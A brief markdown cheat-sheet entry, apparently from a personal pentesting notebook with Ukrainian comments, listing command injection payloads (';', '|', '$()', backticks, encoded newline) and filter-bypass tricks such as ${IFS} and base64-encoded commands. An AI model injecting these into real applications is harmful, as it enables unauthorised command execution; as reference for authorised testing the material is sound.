# Command Injection

```bash
; id
| id
$(id)
`id`
%0a id            # обхід фільтрів через newline
```
**Обхід фільтрів:** ${IFS} замість пробілу, конкатенація, base64-енкод команди.
**Зв'язки:** [[Shells-Payloads]]
